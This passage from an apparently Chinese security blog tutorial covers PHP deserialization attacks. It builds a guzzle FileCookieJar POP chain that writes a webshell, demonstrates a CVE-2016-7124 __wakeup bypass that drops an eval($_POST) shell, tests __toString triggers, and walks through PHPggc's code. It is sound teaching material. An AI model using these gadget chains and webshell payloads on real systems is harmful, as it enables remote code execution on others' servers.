class="line">&#125;</span><br></pre></td></tr></table></figure><p>应用使用的库中的可利用的POP组件：guzzlehttp/guzzle</p><p>寻找POP组件的最好方式，就是直接看<code>composer.json</code>文件，该文件中写明了应用需要使用的库。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &#123;</span><br><span class="line">    <span class="string">"require"</span>: &#123;</span><br><span class="line">    <span class="string">"cartalyst/sentry"</span>: <span class="string">"2.1.5"</span>,</span><br><span class="line">    <span class="string">"illuminate/database"</span>: <span class="string">"4.0.*"</span>,</span><br><span class="line">    <span class="string">"guzzlehttp/guzzle"</span>: <span class="string">"6.0.2"</span>,</span><br><span class="line">    <span class="string">"swiftmailer/swiftmailer"</span>: <span class="string">"5.4.1"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-寻找可以利用的POP组件"><a href="#2-寻找可以利用的POP组件" class="headerlink" title="2. 寻找可以利用的POP组件"></a>2. 寻找可以利用的POP组件</h4><p>我们下载guzzlehttp/guzzle这个依赖库，并使用grep来搜索一下<code>__destruct()</code>和<code>__wakeup()</code></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999994724838.jpg" alt=""></p><p>逐个看一下，在/guzzle/src/Cookie/FileCookieJar.php发现可利用的POP组件：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999995535422.jpg" alt=""></p><p>跟进看一下save方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999996019593.jpg" alt=""></p><p>存在一下代码，造成任意文件写操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">false</span> === file_put_contents($filename, $jsonStr))</span><br></pre></td></tr></table></figure><p>注意到现在<code>$filename</code>可控，也就是文件名可控。同时看到<code>$jsonStr</code>为上层循环来得到的数组经过json编码后得到的，且数组内容为<code>$cookie-&gt;toArray()</code>，也就是说如果我们可控<code>$cookie-&gt;toArray()</code>的值，我们就能控制文件内容。</p><p>如何找到<code>$cookie</code>呢？注意到前面</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000019016695.jpg" alt=""></p><p>跟进父类，看到父类implements了CookieJarInterface</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000019757754.jpg" alt=""></p><p>还有其中的toArray方法</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000020174432.jpg" alt=""></p><p>很明显调用了其中的SetCookie的接口：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000021165941.jpg" alt=""></p><p>看一下目录结构：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000021860870.jpg" alt=""></p><p>所以定位到SetCookie.php：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000022331337.jpg" alt=""></p><p>可以看到，这里只是简单的返回了data数组的特定键值。</p><h4 id="3-手动验证，并构建POP链"><a href="#3-手动验证，并构建POP链" class="headerlink" title="3. 手动验证，并构建POP链"></a>3. 手动验证，并构建POP链</h4><p>首先我们先在vm中写一个composer.json文件：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"require"</span>: &#123;</span><br><span class="line">        <span class="attr">"guzzlehttp/guzzle"</span>: <span class="string">"6.0.2"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来安装Composer：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sS https://getcomposer.org/installer | php</span><br></pre></td></tr></table></figure><p>然后根据composer.json来安装依赖库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php composer.phar install</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000052755445.jpg" alt=""></p><p>接下来，我们根据上面的分析，来构造payload：</p><blockquote><p>payload.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Cookie</span>\<span class="title">FileCookieJar</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Cookie</span>\<span class="title">SetCookie</span>;</span><br><span class="line"></span><br><span class="line">        $obj = <span class="keyword">new</span> FileCookieJar(<span class="string">'./shell.php'</span>);</span><br><span class="line"></span><br><span class="line">        $payload = <span class="string">'&lt;?php echo system($_POST[\'poc\']);?&gt;'</span>;</span><br><span class="line">        $obj-&gt;setCookie(<span class="keyword">new</span> SetCookie([</span><br><span class="line">                <span class="string">'Name'</span> =&gt; <span class="string">'lucifaer'</span>,</span><br><span class="line">                <span class="string">'Value'</span> =&gt; <span class="string">'test_poc'</span>,</span><br><span class="line">                <span class="string">'Domain'</span> =&gt; $paylaod,</span><br><span class="line">                <span class="string">'Expires'</span> =&gt; time()</span><br><span class="line">        ]));</span><br><span class="line"></span><br><span class="line">        file_put_contents(<span class="string">'./build_poc'</span>, serialize($obj));</span><br></pre></td></tr></table></figure><p>我们执行完该脚本，看一下生成的脚本的内容：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000080660821.jpg" alt=""></p><p>我们再写一个反序列化的demo脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line">    unserialize(file_get_contents(<span class="string">"./build_poc"</span>));</span><br></pre></td></tr></table></figure><p>运行后，完成任意文件写操作。至此，我们可以利用生成的序列化攻击向量来进行测试。</p><h2 id="3-PHP语言本身漏洞"><a href="#3-PHP语言本身漏洞" class="headerlink" title="3. PHP语言本身漏洞"></a>3. PHP语言本身漏洞</h2><p>提到这一点就不得不说去年的<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7124" target="_blank" rel="noopener">CVE-2016-7124</a>，同时具有代表性的漏洞即为<a href="http://bobao.360.cn/learning/detail/3020.html" target="_blank" rel="noopener">SugarCRM v6.5.23 PHP反序列化对象注入</a>。</p><p>在这里我们就不多赘述SugarCRM的这个漏洞，我们来聊一聊<code>CVE-2016-7124</code>这个漏洞。</p><p>触发该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10。</p><p>漏洞可以简要的概括为：当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过<code>__wakeup()</code>的执行。</p><p>我们用一个demo来解释一下。</p><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">private</span> $poc = <span class="string">''</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($poc)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;poc = $poc;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;poc != <span class="string">''</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           file_put_contents(<span class="string">'shell.php'</span>, <span class="string">'&lt;?php eval($_POST[\'shell\']);?&gt;'</span>);</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">'Success!!!'</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">'fail to getshell!!!'</span>);</span><br><span class="line">       &#125;        </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"waking up...\n"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">$poc = $_GET[<span class="string">'poc'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($poc))</span><br><span class="line">&#123;</span><br><span class="line">   show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">   <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$a = unserialize($poc);</span><br></pre></td></tr></table></figure><p>代码很简单，但是关键就是需要再反序列化的时候绕过<code>__wakeup</code>以达到写文件的操作。</p><p>根据cve-2016-7124我们可以构造一下我们的poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $poc = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($poc)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;poc = $poc;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;poc != <span class="string">''</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                file_put_contents(<span class="string">'shell.php'</span>, <span class="string">'&lt;?php eval($_POST[\'shell\']);?&gt;'</span>);</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'Success!!!'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'fail to getshell!!!'</span>);</span><br><span class="line">            &#125;        </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"waking up...\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">$a = <span class="keyword">new</span> Test(<span class="string">'shell'</span>);</span><br><span class="line">$poc = serialize($a);</span><br><span class="line"><span class="keyword">print</span>($poc);</span><br></pre></td></tr></table></figure><p>运行该脚本，我们就获得了我们poc</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000946064992.jpg" alt=""></p><p>通上文所说道的，在这里需要改两个地方：</p><ul><li>将1改为大于1的任何整数</li><li>将<code>Testpoc</code>改为<code>%00Test%00poc</code></li></ul><p>传入修改后的poc，即可看到：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000947516393.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000947623762.jpg" alt=""></p><p>写文件操作执行成功。</p><h1 id="0x05-拓展思路"><a href="#0x05-拓展思路" class="headerlink" title="0x05 拓展思路"></a>0x05 拓展思路</h1><h2 id="1-抛砖引玉——魔法函数可能造成的威胁"><a href="#1-抛砖引玉——魔法函数可能造成的威胁" class="headerlink" title="1. 抛砖引玉——魔法函数可能造成的威胁"></a>1. 抛砖引玉——魔法函数可能造成的威胁</h2><p>刚刚想到这一点的时候准备好好研究一下，没想到p师傅第二天小密圈就放出来这个话题了。接下来顺着这个思路，我们向下深挖一下。</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p>经过上面的总结，我们不难看出，PHP中反序列化导致的漏洞中，除了利用PHP本身的漏洞以外，我们通常会寻找<code>__destruct</code>、<code>__wakeup</code>、<code>__toString</code>等方法，看看这些方法中是否有可利用的代码。</p><p>而由于惯性思维，<code>__toString</code>常常被漏洞挖掘者忽略。其实，当反序列化后的对象被输出在模板中的时候（转换成字符串的时候），就可以触发相应的漏洞。</p><p><code>__toString</code>触发条件：</p><ul><li><code>echo ($obj) / print($obj)</code> 打印时会触发</li><li>字符串连接时</li><li>格式化字符串时</li><li>与字符串进行<code>==</code>比较时（PHP进行==比较的时候会转换参数类型）</li><li>格式化SQL语句，绑定参数时</li><li>数组中有字符串时</li></ul><p>我们来写一个demo看一下</p><blockquote><p>toString_demo.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">toString_demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test1 = <span class="string">'test1'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test1 = $test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"__destruct:"</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="keyword">$this</span>-&gt;test1;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"__wakeup:"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test1 = <span class="string">"wakeup"</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="keyword">$this</span>-&gt;test1.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __toString() method.</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"__toString:"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test1 = <span class="string">"tosTRING"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test1.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> toString_demo(<span class="string">"demo"</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line">$c = unserialize($b);</span><br><span class="line"></span><br><span class="line"><span class="comment">//print "\n".$a."\n";</span></span><br><span class="line"><span class="comment">//print $b."\n";</span></span><br><span class="line"><span class="keyword">print</span> $c;</span><br></pre></td></tr></table></figure><p>执行结果为下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001060847306.jpg" alt=""></p><p>通过上面的测试，可以总结以下几点：</p><ul><li><code>echo ($obj) / print($obj)</code> 打印时会触发</li><li><code>__wakeup</code>的优先级&gt;<code>__toString</code>&gt;<code>__destruct</code></li><li>每执行完一个魔法函数，</li></ul><p>接下来从两个方面继续来深入：</p><ul><li>字符串操作</li><li>魔术函数的优先级可能造成的变量覆盖</li></ul><h4 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h4><ul><li><p>字符串拼接：</p><p>  在字符串与反序列化后的对象与字符串进行字符串拼接时，会触发<code>__toString</code>方法。</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001078785425.jpg" alt=""></p></li><li><p>字符串函数：</p><p>  经过测试，当反序列化后的最想在经过php字符串函数时，都会执行<code>__toString</code>方法，从这一点我们就可以看出，<code>__toString</code>所可能造成的安全隐患。</p><p>  下面举几个常见的函数作为例子（所使用的类还是上面给出的toString_demo类）：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001086072919.jpg" alt=""></p></li></ul><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001088645356.jpg" alt=""></p><h4 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h4><p>将反序列化后的对象加入到数组中，并不会触发<code>__toString</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001858902513.jpg" alt=""></p><p>但是在<code>in_array()</code>方法中，在数组中有<code>__toString</code>返回的字符串的时候<code>__toString</code>会被调用：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001890784548.jpg" alt=""></p><h4 id="class-exists"><a href="#class-exists" class="headerlink" title="class_exists"></a>class_exists</h4><p>从<code>in_array()</code>方法中，我们又有了拓展性的想法。我们都知道，在php底层，类似于<code>in_array()</code>这类函数，都属于先执行，之后返回判断结果。那么顺着这个想法，我想到了去年的<a href="http://paper.seebug.org/11/" target="_blank" rel="noopener">IPS Community Suite &lt;= 4.1.12.3 Autoloaded PHP远程代码执行漏洞</a>，这个漏洞中有一个非常有意思的触发点，就是通过<code>class_exists</code>造成相关类的调用，从而触发漏洞。</p><p>通过测试，我们发现了，如果将反序列化后的对象带入<code>class_exists()</code>方法中，同样会造成<code>__toString</code>的执行：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001897871207.jpg" alt=""></p><h2 id="2-猜想——对象处理过程可能出现的威胁"><a href="#2-猜想——对象处理过程可能出现的威胁" class="headerlink" title="2. 猜想——对象处理过程可能出现的威胁"></a>2. 猜想——对象处理过程可能出现的威胁</h2><p>通过<code>class_exists</code>可能触发的危险操作，继续向下想一下，是否在对象处理过程中也有可能存在漏洞呢？</p><p>还记的去年爆出了一个<a href="https://bugs.php.net/bug.php?id=72433" target="_blank" rel="noopener">PHP GC算法和反序列化机制释放后重用漏洞</a>，是垃圾回收机制本身所出现的问题，在释放与重用的过程中存在的问题。</p><p>顺着这个思路，大家可以继续在对象创建、对象执行、对象销毁方面进行深入的研究。</p><h1 id="0x06-PHPggc"><a href="#0x06-PHPggc" class="headerlink" title="0x06 PHPggc"></a>0x06 PHPggc</h1><p>在0x04的第二节中，我们提到了cms在引用某些依赖库时，可能存在（反）序列化漏洞。那么是否有工具可以生成这些通用型漏洞的测试向量呢？</p><p>当然是存在的。在github上我们找到了<a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">PHPggc</a>这个工具，它可以快速的生成主流框架的序列化测试向量。</p><h2 id="关于该测试框架的一点简单的分析"><a href="#关于该测试框架的一点简单的分析" class="headerlink" title="关于该测试框架的一点简单的分析"></a>关于该测试框架的一点简单的分析</h2><h3 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1. 目录结构"></a>1. 目录结构</h3><p>目录结构为下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|- phpggc </span><br><span class="line">|-- gadgetchains    // 相应框架存在漏洞的类以及漏洞利用代码</span><br><span class="line">|-- lib             // 框架调度及核心代码</span><br><span class="line">|-- phpggc          // 入口</span><br><span class="line">|-- README.md</span><br></pre></td></tr></table></figure><h3 id="2-框架运行流程"><a href="#2-框架运行流程" class="headerlink" title="2. 框架运行流程"></a>2. 框架运行流程</h3><p>首先，入口文件为<code>phpggc</code>，直接跟进<code>lib/PHPGGC.php</code>框架核心文件。</p><p>在<code>__construct</code>中完成了当前文件完整路径的获取，以及定义自动加载函数，以实现对于下面的类的实例化操作。</p><p>关键的操作为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;gadgets = <span class="keyword">$this</span>-&gt;get_gadget_chains();</span><br></pre></td></tr></table></figure><p>可以跟进代码看一看，其完成了对于所有payload的加载及保存，将所有的payload进行实例化，并保存在一个全局数组中，以方便调用。</p><p>可以动态跟进，看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_gadget_chains</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;include_gadget_chains();</span><br><span class="line"></span><br><span class="line">        $classes = get_declared_classes();</span><br><span class="line">        $classes = array_filter($classes, <span class="function"><span class="keyword">function</span><span class="params">($class)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> is_subclass_of($class, <span class="string">'\\PHPGGC\\GadgetChain'</span>) &amp;&amp;</span><br><span class="line">                   strpos($class, <span class="string">'GadgetChain\\'</span>) === <span class="number">0</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        $objects = array_map(<span class="function"><span class="keyword">function</span><span class="params">($class)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> $class();</span><br><span class="line">        &#125;, $classes);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Convert backslashes in classes names to forward slashes,</span></span><br><span class="line">        <span class="comment"># so that the command line is easier to use</span></span><br><span class="line">        $classes = array_map(<span class="function"><span class="keyword">function</span><span class="params">($class)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> strtolower(str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $class));</span><br><span class="line">        &#125;, $classes);</span><br><span class="line">        <span class="keyword">return</span> array_combine($classes, $objects);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进<code>include_gadget_chains</code>方法中看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">include_gadget_chains</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $base = <span class="keyword">$this</span>-&gt;base . <span class="keyword">self</span>::DIR_GADGETCHAINS;</span><br><span class="line">        $files = glob($base . <span class="string">'/*/*/*/chain.php'</span>);</span><br><span class="line">        array_map(<span class="function"><span class="keyword">function</span> <span class="params">($file)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">include_once</span> $file;</span><br><span class="line">        &#125;, $files);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在这边首先获取到当前路径，之后从根目录将其下子目录中的所有<code>chain.php</code>遍历一下，将其路劲存储到<code>$files</code>数组中。接着将数组中的所有<code>chain.php</code>包含一遍，保证之后的调用。</p><p>回到<code>get_gadget_chains</code>接着向下看，将返回所有已定义类的名字所组成的数组，将其定义为<code>$classes</code>，接着将是<code>PHPGGC\GadgetChain</code>子类的类，全部筛选出来（也就是将所有的payload筛选出来），并将其实例化，在其完成格式化后，返回一个由其名与实例化后的类所组成的键值数组。</p><p>到此，完成了最基本框架加载与类的实例化准备。</p><p>跟着运行流程，看到<code>generate</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generate</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $argv;</span><br><span class="line"></span><br><span class="line">        $parameters = <span class="keyword">$this</span>-&gt;parse_cmdline($argv);</span><br><span class="line"></span><br><span 